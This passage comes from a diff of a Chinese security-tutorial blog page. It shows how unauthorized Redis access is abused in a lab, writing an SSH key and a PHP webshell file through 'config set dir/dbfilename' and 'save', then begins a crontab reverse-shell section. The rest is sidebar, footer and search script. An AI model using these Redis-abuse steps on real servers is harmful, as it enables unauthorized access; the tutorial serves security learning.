class="line"><span class="comment"># 将公钥的值保存到要操作的文件</span></span><br><span class="line">10.211.55.4:6379&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>
+<p>SSH 登录验证：</p>
+<p><img src="http://qiniuyun.lintstar.top/20200809021341.png" alt="20200809021341"></p>
+<h2 id="未授权访问写入Webshell"><a href="#未授权访问写入Webshell" class="headerlink" title="未授权访问写入Webshell"></a>未授权访问写入Webshell</h2><p>原理和写入SSH一样，首先 Kali Linux 开启 Apache：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启动 Apache</span></span><br><span class="line">systemctl start apache2</span><br><span class="line">systemctl status apache2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入 info.php 测试</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;?php phpinfo();?&gt;'</span> &gt; /var/www/html/info.php</span><br></pre></td></tr></table></figure>
+<p>然后浏览器访问：<a href="http://127.0.0.1/info.php" target="_blank" rel="noopener">http://127.0.0.1/info.php</a> 查看是否生效。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 操作目录</span></span><br><span class="line">10.211.55.4:6379&gt; config <span class="built_in">set</span> dir /var/www/html/</span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line"><span class="comment"># 操作文件</span></span><br><span class="line">10.211.55.4:6379&gt; config <span class="built_in">set</span> dbfilename shell.php</span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置数据</span></span><br><span class="line">10.211.55.4:6379&gt; <span class="built_in">set</span> x <span class="string">"&lt;?php phpinfo();?&gt;"</span></span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入数据</span></span><br><span class="line">10.211.55.4:6379&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>
+<h2 id="未授权访问弹-shell"><a href="#未授权访问弹-shell" class="headerlink" title="未授权访问弹 shell"></a>未授权访问弹 shell</h2><h3 id="crontab-定时任务"><a href="#crontab-定时任务" class="headerlink" title="crontab 定时任务"></a>crontab 定时任务</h3><p>Linux 下使用原生的 crontab 命令实现定时任务：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看定时任务</span></span><br><span class="line">crontab -l</span><br><span class="line"></span><br><span class="line"><span class="comment"># 编辑定时任务</span></span><br><span class="line">crontab -e</span><br></pre></td></tr></table></figure>
+<p>编辑定时任务，一行一个任务，填写的内容如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 分 时 日 月 星期 要运行的命令</span></span><br><span class="line">30 9 * * * /usr/bin/python3 /root/code/t00ls/TuBi.py&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p>表示每天 9:30 自动运行下面的命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/python3 /root/code/t00ls/TuBi.py</span><br></pre></td></tr></table></figure>
+<p>这样看起来是不是很简单呢，如果语法没有问题的话，会得到如下提示：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab: installing new crontab</span><br></pre></td></tr></table></figure>
+<p>这表示新建定时任务成功。</p>
+<h4 id="crontab-实例"><a href="#crontab-实例" class="headerlink" title="crontab 实例"></a>crontab 实例</h4><p><strong>实例1：每 1 分钟执行一次 myCommand</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* * * * * myCommand</span><br></pre></td></tr></table></figure>
+<p><strong>实例2：每小时的第 3 和第 15 分钟执行</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3,15 * * * * myCommand</span><br></pre></td></tr></table></figure>
+<p><strong>实例3：在上午 8 点到 11 点的第 3 和第 15 分钟执行</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3,15 8-11 * * * myCommand</span><br></pre></td></tr></table></figure>
+<p><strong>实例4：每隔两天的上午 8 点到 11 点的第 3 和第 15 分钟执行</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3,15 8-11 */2  *  * myCommand</span><br></pre></td></tr></table></figure>
+<p><strong>实例5：每周一上午 8 点到 11 点的第 3 和第 15 分钟执行</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3,15 8-11 * * 1 myCommand</span><br></pre></td></tr></table></figure>
+<p><strong>实例6：每晚的21:30重启smb</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">30 21 * * * /etc/init.d/smb restart</span><br></pre></td></tr></table></figure>
+<p><strong>实例7：每月1、10、22日的 4 : 45 重启smb</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">45 4 1,10,22 * * /etc/init.d/smb restart</span><br></pre></td></tr></table></figure>
+<p><strong>实例8：每周六、周日的 1 : 10 重启 smb</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10 1 * * 6,0 /etc/init.d/smb restart</span><br></pre></td></tr></table></figure>
+<p><strong>实例9：每天 18 : 00 至 23 : 00 之间每隔 30 分钟重启smb</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0,30 18-23 * * * /etc/init.d/smb restart</span><br></pre></td></tr></table></figure>
+<p><strong>实例10：每星期六的晚上 23 : 00 重启smb</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 23 * * 6 /etc/init.d/smb restart</span><br></pre></td></tr></table></figure>
+<p><strong>实例11：每一小时重启smb</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* */1 * * * /etc/init.d/smb restart</span><br></pre></td></tr></table></figure>
+<p><strong>实例12：晚上11点到早上7点之间，每隔一小时重启smb</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 23-7 * * * /etc/init.d/smb restart</span><br></pre></td></tr></table></figure>
+<p><strong>关于 /etc/crontab 及 /var/spool/cron/crontabs/$USER 中定义的定时任务</strong></p>
+<p>/etc/crontab 只有 root 用户可以使用，使用时需root权限，而且<strong>必须指定运行用户</strong>，才会执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* * * * * root myCommand</span><br></pre></td></tr></table></figure>
+<p>/var/spool/cron/$USER 所有用户都可以使用，可以使用 crontab -u username -e 命令来直接编辑这个文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* * * * * myCommand</span><br></pre></td></tr></table></figure>
+<p>Kali 的 shell 下有点问题，Ubuntu 16.10 已将先前默认的 bashshell 更换为了 dashshell。Debian 和 Ubuntu中，/bin/sh 默认已经指向 dash，这是一个不同于 bash 的 shell，它主要是为了执行脚本而出现，而不是交互，它速度更快，但功能相比bash要少很多，语法严格遵守POSIX标准。因为缺少了binbash的交互特性，所以kali中弹不回shell可以得到很好的解释了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -fs /bin/bash /bin/sh</span><br></pre></td></tr></table></figure>
+<h4 id="nc-命令教程"><a href="#nc-命令教程" class="headerlink" title="nc 命令教程"></a>nc 命令教程</h4><p><a href="https://www.sqlsec.com/2019/10/nc.html" target="_blank" rel="noopener">https://www.sqlsec.com/2019/10/nc.html</a></p>
+<p>nc 被誉为网络安全界的瑞士军刀，一个简单而有用的工具，透过使用 TCP 或 UDP 协议的网络连接去读写数据。</p>
+
+        
+      </div>
+      
+      
+      
+    </div>
+    
+    
+    
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.png" alt="离沫凌天๓">
+            
+              <p class="site-author-name" itemprop="name">离沫凌天๓</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">20</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#认证技术"><span class="nav-number">1.</span> <span class="nav-text">认证技术</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Web认证爆破"><span class="nav-number">2.</span> <span class="nav-text">Web认证爆破</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#DWVA-靶场搭建"><span class="nav-number">2.1.</span> <span class="nav-text">DWVA 靶场搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DVWA-基础爆破"><span class="nav-number">2.2.</span> <span class="nav-text">DVWA 基础爆破</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CTFHub-Basic-基础认证爆破"><span class="nav-number">2.3.</span> <span class="nav-text">CTFHub Basic 基础认证爆破</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#四位纯数字爆破"><span class="nav-number">2.4.</span> <span class="nav-text">四位纯数字爆破</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#四种常见的-POST-提交数据方式"><span class="nav-number">2.5.</span> <span class="nav-text">四种常见的 POST 提交数据方式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#application-x-www-form-urlencoded"><span class="nav-number">2.5.1.</span> <span class="nav-text">application/x-www-form-urlencoded</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#multipart-form-data"><span class="nav-number">2.5.2.</span> <span class="nav-text">multipart/form-data</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#application-json"><span class="nav-number">2.5.3.</span> <span class="nav-text">application/json</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#text-xml"><span class="nav-number">2.5.4.</span> <span class="nav-text">text/xml</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#带验证码爆破"><span class="nav-number">2.6.</span> <span class="nav-text">带验证码爆破</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DVWA-High-带-Token-爆破"><span class="nav-number">2.7.</span> <span class="nav-text">DVWA - High 带 Token 爆破</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#系统认证爆破"><span class="nav-number">3.</span> <span class="nav-text">系统认证爆破</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#爆破工具"><span class="nav-number">3.1.</span> <span class="nav-text">爆破工具</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Hydra-九头蛇"><span class="nav-number">3.2.</span> <span class="nav-text">Hydra 九头蛇</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SNETCracker"><span class="nav-number">3.3.</span> <span class="nav-text">SNETCracker</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Metasploit"><span class="nav-number">3.4.</span> <span class="nav-text">Metasploit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#常见爆破思路"><span class="nav-number">3.5.</span> <span class="nav-text">常见爆破思路</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#爆破-21-FTP"><span class="nav-number">3.5.1.</span> <span class="nav-text">爆破 21 FTP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#爆破-22-SSH"><span class="nav-number">3.5.2.</span> <span class="nav-text">爆破 22 SSH</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#爆破-23-Telnet"><span class="nav-number">3.5.3.</span> <span class="nav-text">爆破 23 Telnet</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#爆破-445-SMB"><span class="nav-number">3.5.4.</span> <span class="nav-text">爆破 445 SMB</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#爆破-Samba"><span class="nav-number">3.5.5.</span> <span class="nav-text">爆破 Samba</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#爆破-1433-MSSQL"><span class="nav-number">3.5.6.</span> <span class="nav-text">爆破 1433 MSSQL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#爆破-1521-Oracle"><span class="nav-number">3.5.7.</span> <span class="nav-text">爆破 1521 Oracle</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#爆破-3306-MySQL"><span class="nav-number">3.5.8.</span> <span class="nav-text">爆破 3306 MySQL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#爆破-3389-RDP"><span class="nav-number">3.5.9.</span> <span class="nav-text">爆破 3389 RDP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#爆破-5432-PostgreSQL"><span class="nav-number">3.5.10.</span> <span class="nav-text">爆破 5432 PostgreSQL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#爆破-6379-Redis"><span class="nav-number">3.5.11.</span> <span class="nav-text">爆破 6379 Redis</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#爆破-8080-Tomcat"><span class="nav-number">3.5.12.</span> <span class="nav-text">爆破 8080 Tomcat</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#爆破-27017-MongoDB"><span class="nav-number">3.5.13.</span> <span class="nav-text">爆破 27017 MongoDB</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#未授权访问"><span class="nav-number">4.</span> <span class="nav-text">未授权访问</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Redis-未授权访问"><span class="nav-number">4.1.</span> <span class="nav-text">Redis 未授权访问</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows-安装"><span class="nav-number">4.1.1.</span> <span class="nav-text">Windows 安装</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#一些基本的交互命令"><span class="nav-number">4.1.1.1.</span> <span class="nav-text">一些基本的交互命令</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Linux-编译安装"><span class="nav-number">4.1.2.</span> <span class="nav-text">Linux 编译安装</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Linux-apt-安装"><span class="nav-number">4.1.3.</span> <span class="nav-text">Linux apt 安装</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#未授权访问修改公私钥"><span class="nav-number">4.1.4.</span> <span class="nav-text">未授权访问修改公私钥</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#安装配置SSH"><span class="nav-number">4.1.4.1.</span> <span class="nav-text">安装配置SSH</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#配置公私钥"><span class="nav-number">4.1.4.2.</span> <span class="nav-text">配置公私钥</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#模拟真实攻击"><span class="nav-number">4.1.4.3.</span> <span class="nav-text">模拟真实攻击</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#未授权访问写入Webshell"><span class="nav-number">4.2.</span> <span class="nav-text">未授权访问写入Webshell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#未授权访问弹-shell"><span class="nav-number">4.3.</span> <span class="nav-text">未授权访问弹 shell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#crontab-定时任务"><span class="nav-number">4.3.1.</span> <span class="nav-text">crontab 定时任务</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#crontab-实例"><span class="nav-number">4.3.1.1.</span> <span class="nav-text">crontab 实例</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#nc-命令教程"><span class="nav-number">4.3.1.2.</span> <span class="nav-text">nc 命令教程</span></a></li></ol></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">离沫凌天๓</span>
+
+  
+</div>
+
+<!--
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+-->
+
+<div class="busuanzi-count">
+    <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+    来访人数：<span class="busuanzi-value" id="busuanzi_value_site_uv"></span> 
+    </span>
+    <div class="powered-by"></div>
+    <span class="site-uv">
+      <i class="fa fa-eye"></i>
+    访问次数：<span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+    <!-- 博客字数统计 -->
+    <span class="site-pv">
+      <i class="fa fa-pencil"></i>
+    全站字数：<span class="post-count">115.8k</span>
+    </span>
+</div>
+
+
+
+
+
+<div class="BbeiAn-info">
+   	<!--津ICP备  -->
+    <a target="_blank" href="http://www.beian.miit.gov.cn/" style="color:#f0d784" rel="nofollow">津ICP备18005284</a> <!--a标签中增加nofollow属性，避免爬虫出站。-->| 
+	<a target="_blank" href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=12011102000578" style="color:#f0d784;text-decoration:none;padding-left:30px;background:url(https://s1.ax1x.com/2018/09/29/ilmwIH.png) no-repeat left center" rel="nofollow">津公网安备12011102000578号</a>	  <!--这里将图标作为了背景，以使得能和后面的文字在同一行-->
+</div>
+
+<!--
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+-->
+
+
+
+<!-- 在网页底部添加网站运行时间 -->
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("05/21/2019 00:00:00");//此处修改你的建站时间或者网站上线时间
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "Run for "+dnum+" Days ";
+        document.getElementById("times").innerHTML = hnum + " Hours " + mnum + " m " + snum + " s";
+    }
+setInterval("createtime()",250);
+</script>
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/three.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/canvas_lines.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
